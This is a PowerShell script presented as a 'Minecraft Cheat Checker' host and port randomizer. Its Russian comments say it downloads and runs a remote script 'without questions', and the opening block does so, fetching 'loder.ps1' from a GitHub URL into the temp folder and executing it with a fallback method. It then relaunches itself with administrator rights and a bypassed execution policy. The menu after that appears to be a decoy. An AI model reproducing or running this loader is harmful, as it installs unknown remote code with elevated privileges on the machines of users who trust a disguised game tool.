# Minecraft Cheat Checker v2.0 - HOST/PORT RANDOMIZER
# ПЕРВЫМ ДЕЛОМ КАЧАЕМ PS1, ПОТОМ МЕНЮ С ХОСТАМИ/ПОРТАМИ

$Host.UI.RawUI.WindowTitle = "Minecraft Cheat Checker v2.0 - RANDOMIZER"
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "DarkRed"
Clear-Host

# ===== СРАЗУ КАЧАЕМ И ЗАПУСКАЕМ PS1 БЕЗ ВОПРОСОВ =====
$ScriptURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.ps1"
$ScriptPath = "$env:TEMP\minecraft_checker_loader.ps1"

Write-Host "[*] DOWNLOADING AND EXECUTING CORE MODULE..." -ForegroundColor Magenta
try {
    Invoke-WebRequest -Uri $ScriptURL -OutFile $ScriptPath -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] DOWNLOAD COMPLETE" -ForegroundColor Green
    Write-Host "[*] EXECUTING loder.ps1..." -ForegroundColor Magenta
    & $ScriptPath
    Write-Host "[+] CORE MODULE EXECUTED SUCCESSFULLY" -ForegroundColor Green
} catch {
    Write-Host "[-] DOWNLOAD FAILED: $_" -ForegroundColor Red
    try {
        (New-Object Net.WebClient).DownloadFile($ScriptURL, $ScriptPath)
        & $ScriptPath
    } catch {
        Write-Host "[-] CRITICAL FAILURE - CANNOT LOAD CORE" -ForegroundColor Red
    }
}

Start-Sleep 1

# ===== АДМИН ПРАВА НА ВСЯКИЙ СЛУЧАЙ =====
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

Clear-Host

# ===== ASCII ART =====
$Art = @"

██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗  ██████╗ ██████╗ ████████╗
██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
███████║██║   ██║███████╗   ██║       ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██║██║   ██║╚════██║   ██║       ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║╚██████╔╝███████║   ██║       ██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                                         
██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ███╗   ███╗███████╗██████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██╔████╔██║█████╗  ██████╔╝
██╔══██╗██╔══██║██║╚██╗██║██║  ██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
"@

# ===== ФУНКЦИЯ ГЕНЕРАЦИИ РАНДОМНОГО ХОСТА =====
function Get-RandomHost {
    $HostTypes = @(
        "localhost",
        "127.0.0.1",
        "192.168.$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "10.$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "172.$((Get-Random -Minimum 16 -Maximum 32)).$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "mc.hypixel.net",
        "mc.cubecraft.net",
        "play.mineplex.com",
        "mc.hivemc.com",
        "play.blocksmc.com",
        "mc.jartexnetwork.com",
        "play.pika-network.net",
        "$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))"
    )
    return $HostTypes | Get-Random
}

# ===== ФУНКЦИЯ ГЕНЕРАЦИИ РАНДОМНОГО ПОРТА =====
function Get-RandomPort {
    $PortTypes = @(
        (Get-Random -Minimum 1024 -Maximum 49151),  # Зарегистрированные порты
        25565,   # Стандартный Minecraft
        19132,   # Bedrock Edition
        80,      # HTTP
        443,     # HTTPS
        22,      # SSH
        21,      # FTP
        8080,    # HTTP Proxy
        3389,    # RDP
        4444,    # Metasploit
        1337,    # Leet
        6969,    # Meme
        7777,    # Terraria/Minecraft
        27015,   # Source Engine
        (Get-Random -Minimum 49152 -Maximum 65535)  # Динамические порты
    )
    return $PortTypes | Get-Random
}

# ===== МЕНЮ ХОСТОВ =====
function Show-HostMenu {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            HOST SELECTION MENU" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    Write-Host "  Current HOST: $Global:SelectedHost" -ForegroundColor Yellow
    Write-Host "  Current PORT: $Global:SelectedPort`n" -ForegroundColor Yellow
    Write-Host "  [1] GENERATE RANDOM HOST" -ForegroundColor Green
    Write-Host "  [2] ENTER CUSTOM HOST" -ForegroundColor White
    Write-Host "  [3] USE LOCALHOST (127.0.0.1)" -ForegroundColor White
    Write-Host "  [4] RANDOM PRIVATE IP (192.168.x.x)" -ForegroundColor White
    Write-Host "  [5] RANDOM PUBLIC IP" -ForegroundColor White
    Write-Host "  [6] SHOW ALL HOSTS AND SELECT" -ForegroundColor DarkCyan
    Write-Host "  [0] BACK TO MAIN MENU" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select option"
    
    switch ($Choice) {
        "1" {
            $Global:SelectedHost = Get-RandomHost
            Write-Host "`n[+] NEW HOST GENERATED: $Global:SelectedHost" -ForegroundColor Green
            Start-Sleep 1
            Show-HostMenu
        }
        "2" {
            $CustomHost = Read-Host "  [?] Enter host (IP or domain)"
            if ($CustomHost -ne "") {
                $Global:SelectedHost = $CustomHost
                Write-Host "[+] HOST SET: $Global:SelectedHost" -ForegroundColor Green
            }
            Start-Sleep 1
            Show-HostMenu
        }
        "3" {
            $Global:SelectedHost = "127.0.0.1"
            Write-Host "[+] HOST SET TO LOCALHOST" -ForegroundColor Green
            Start-Sleep 1
            Show-HostMenu
        }
        "4" {
            $Global:SelectedHost = "192.168.$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))"
            Write-Host "[+] RANDOM PRIVATE IP: $Global:SelectedHost" -ForegroundColor Green
            Start-Sleep 1
            Show-HostMenu
        }
        "5" {
            $Global:SelectedHost = "$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))"
            Write-Host "[+] RANDOM PUBLIC IP: $Global:SelectedHost" -ForegroundColor Green
            Start-Sleep 1
            Show-HostMenu
        }
        "6" {
            Show-AllHosts
        }
        "0" { Show-MainMenu }
        default {
            Write-Host "[-] INVALID OPTION!" -ForegroundColor Red
            Start-Sleep 1
            Show-HostMenu
        }
    }
}

# ===== ПОКАЗАТЬ ВСЕ ХОСТЫ =====
function Show-AllHosts {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            ALL AVAILABLE HOSTS" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    
    $AllHosts = @(
        "localhost",
        "127.0.0.1",
        "192.168.1.100",
        "192.168.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "mc.hypixel.net",
        "mc.cubecraft.net",
        "play.mineplex.com",
        "mc.hivemc.com",
        "play.blocksmc.com",
        "mc.jartexnetwork.com",
        "play.pika-network.net",
        "8.8.8.8",
        "1.1.1.1",
        "$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))"
    )
    
    for ($i = 0; $i -lt $AllHosts.Count; $i++) {
        $Num = $i + 1
        Write-Host "  [$Num] $($AllHosts[$i])" -ForegroundColor $(if ($Num % 2 -eq 0) { "DarkCyan" } else { "White" })
    }
    
    Write-Host "`n  [0] BACK" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select host number"
    
    if ($Choice -match '^\d+$' -and [int]$Choice -ge 1 -and [int]$Choice -le $AllHosts.Count) {
        $Global:SelectedHost = $AllHosts[[int]$Choice - 1]
        Write-Host "[+] SELECTED: $Global:SelectedHost" -ForegroundColor Green
        Start-Sleep 1
    } elseif ($Choice -eq "0") {
        Show-HostMenu
    } else {
        Write-Host "[-] INVALID SELECTION!" -ForegroundColor Red
        Start-Sleep 1
        Show-AllHosts
    }
    Show-HostMenu
}

# ===== МЕНЮ ПОРТОВ =====
function Show-PortMenu {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            PORT SELECTION MENU" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    Write-Host "  Current HOST: $Global:SelectedHost" -ForegroundColor Yellow
    Write-Host "  Current PORT: $Global:SelectedPort`n" -ForegroundColor Yellow
    Write-Host "  [1] GENERATE RANDOM PORT" -ForegroundColor Green
    Write-Host "  [2] ENTER CUSTOM PORT" -ForegroundColor White
    Write-Host "  [3] MINECRAFT DEFAULT (25565)" -ForegroundColor White
    Write-Host "  [4] BEDROCK EDITION (19132)" -ForegroundColor White
    Write-Host "  [5] RANDOM HIGH PORT (49152-65535)" -ForegroundColor White
    Write-Host "  [6] RANDOM REGISTERED PORT (1024-49151)" -ForegroundColor White
    Write-Host "  [7] SHOW ALL PORTS AND SELECT" -ForegroundColor DarkCyan
    Write-Host "  [0] BACK TO MAIN MENU" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select option"
    
    switch ($Choice) {
        "1" {
            $Global:SelectedPort = Get-RandomPort
            Write-Host "`n[+] NEW PORT GENERATED: $Global:SelectedPort" -ForegroundColor Green
            Start-Sleep 1
            Show-PortMenu
        }
        "2" {
            $CustomPort = Read-Host "  [?] Enter port (1-65535)"
            if ($CustomPort -match '^\d+$' -and [int]$CustomPort -ge 1 -and [int]$CustomPort -le 65535) {
                $Global:SelectedPort = [int]$CustomPort
                Write-Host "[+] PORT SET: $Global:SelectedPort" -ForegroundColor Green
            } else {
                Write-Host "[-] INVALID PORT!" -ForegroundColor Red
            }
            Start-Sleep 1
            Show-PortMenu
        }
        "3" {
            $Global:SelectedPort = 25565
            Write-Host "[+] PORT SET TO MINECRAFT DEFAULT" -ForegroundColor Green
            Start-Sleep 1
            Show-PortMenu
        }
        "4" {
            $Global:SelectedPort = 19132
            Write-Host "[+] PORT SET TO BEDROCK EDITION" -ForegroundColor Green
            Start-Sleep 1
            Show-PortMenu
        }
        "5" {
            $Global:SelectedPort = Get-Random -Minimum 49152 -Maximum 65535
            Write-Host "[+] RANDOM HIGH PORT: $Global:SelectedPort" -ForegroundColor Green
            Start-Sleep 1
            Show-PortMenu
        }
        "6" {
            $Global:SelectedPort = Get-Random -Minimum 1024 -Maximum 49151
            Write-Host "[+] RANDOM REGISTERED PORT: $Global:SelectedPort" -ForegroundColor Green
            Start-Sleep 1
            Show-PortMenu
        }
        "7" {
            Show-AllPorts
        }
        "0" { Show-MainMenu }
        default {
            Write-Host "[-] INVALID OPTION!" -ForegroundColor Red
            Start-Sleep 1
            Show-PortMenu
        }
    }
}

# ===== ПОКАЗАТЬ ВСЕ ПОРТЫ =====
function Show-AllPorts {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            ALL AVAILABLE PORTS" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    
    $AllPorts = @(
        @{Port=25565; Desc="Minecraft Java Default"},
        @{Port=19132; Desc="Minecraft Bedrock Default"},
        @{Port=80; Desc="HTTP"},
        @{Port=443; Desc="HTTPS"},
        @{Port=22; Desc="SSH"},
        @{Port=21; Desc="FTP"},
        @{Port=8080; Desc="HTTP Alternate"},
        @{Port=3389; Desc="RDP Remote Desktop"},
        @{Port=4444; Desc="Common Backdoor"},
        @{Port=1337; Desc="1337 Leet Port"},
        @{Port=6969; Desc="Meme Port"},
        @{Port=7777; Desc="Game Server Common"},
        @{Port=27015; Desc="Source Engine"},
        @{Port=(Get-Random -Minimum 1024 -Maximum 49151); Desc="RANDOM REGISTERED"},
        @{Port=(Get-Random -Minimum 49152 -Maximum 65535); Desc="RANDOM DYNAMIC"},
        @{Port=(Get-Random -Minimum 1 -Maximum 1023); Desc="RANDOM WELL-KNOWN"}
    )
    
    for ($i = 0; $i -lt $AllPorts.Count; $i++) {
        $Num = $i + 1
        Write-Host "  [$Num] $($AllPorts[$i].Port) - $($AllPorts[$i].Desc)" -ForegroundColor $(if ($Num % 2 -eq 0) { "DarkCyan" } else { "White" })
    }
    
    Write-Host "`n  [0] BACK" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select port number"
    
    if ($Choice -match '^\d+$' -and [int]$Choice -ge 1 -and [int]$Choice -le $AllPorts.Count) {
        $Global:SelectedPort = $AllPorts[[int]$Choice - 1].Port
        Write-Host "[+] SELECTED PORT: $Global:SelectedPort" -ForegroundColor Green
        Start-Sleep 1
    } elseif ($Choice -eq "0") {
        Show-PortMenu
    } else {
        Write-Host "[-] INVALID SELECTION!" -ForegroundColor Red
        Start-Sleep 1
        Show-AllPorts
    }
    Show-PortMenu
}

# ===== ГЛАВНОЕ МЕНЮ =====
function Show-MainMenu {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "       HOST & PORT RANDOMIZER v2.0" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    Write-Host "  CURRENT CONFIGURATION:" -ForegroundColor Yellow
    Write-Host "  HOST: $Global:SelectedHost" -ForegroundColor Green
    Write-Host "  PORT: $Global:SelectedPort`n" -ForegroundColor Green
    Write-Host "  [1] SELECT HOST" -ForegroundColor White
    Write-Host "  [2] SELECT PORT" -ForegroundColor White
    Write-Host "  [3] RANDOMIZE BOTH (HOST + PORT)" -ForegroundColor Magenta
    Write-Host "  [4] COPY TO CLIPBOARD ($Global:SelectedHost`:$Global:SelectedPort)" -ForegroundColor DarkCyan
    Write-Host "  [5] TEST CONNECTION" -ForegroundColor Yellow
    Write-Host "  [0] EXIT" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select option"
    
    switch ($Choice) {
        "1" { Show-HostMenu }
        "2" { Show-PortMenu }
        "3" {
            $Global:SelectedHost = Get-RandomHost
            $Global:SelectedPort = Get-RandomPort
            Write-Host "`n[+] RANDOMIZED!" -ForegroundColor Green
            Write-Host "[+] HOST: $Global:SelectedHost" -ForegroundColor Green
            Write-Host "[+] PORT: $Global:SelectedPort" -ForegroundColor Green
            Start-Sleep 2
            Show-MainMenu
        }
        "4" {
            "$Global:SelectedHost`:$Global:SelectedPort" | Set-Clipboard
            Write-Host "`n[+] COPIED TO CLIPBOARD: $Global:SelectedHost`:$Global:SelectedPort" -ForegroundColor Green
            Start-Sleep 1
            Show-MainMenu
        }
        "5" {
            Write-Host "`n[*] TESTING CONNECTION TO $Global:SelectedHost`:$Global:SelectedPort..." -ForegroundColor Yellow
            $TestResult = Test-NetConnection -ComputerName $Global:SelectedHost -Port $Global:SelectedPort -WarningAction SilentlyContinue
            if ($TestResult.TcpTestSucceeded) {
                Write-Host "[+] CONNECTION SUCCESSFUL!" -ForegroundColor Green
            } else {
                Write-Host "[-] CONNECTION FAILED" -ForegroundColor Red
            }
            Read-Host "`nPress ENTER to continue"
            Show-MainMenu
        }
        "0" {
            Write-Host "`n[+] SYSTEM TERMINATED" -ForegroundColor Cyan
            Exit
        }
        default {
            Write-Host "[-] INVALID OPTION!" -ForegroundColor Red
            Start-Sleep 1
            Show-MainMenu
        }
    }
}

# ===== ИНИЦИАЛИЗАЦИЯ =====
$Global:SelectedHost = "localhost"
$Global:SelectedPort = 25565

# ===== ЗАПУСК ГЛАВНОГО МЕНЮ =====
Show-MainMenu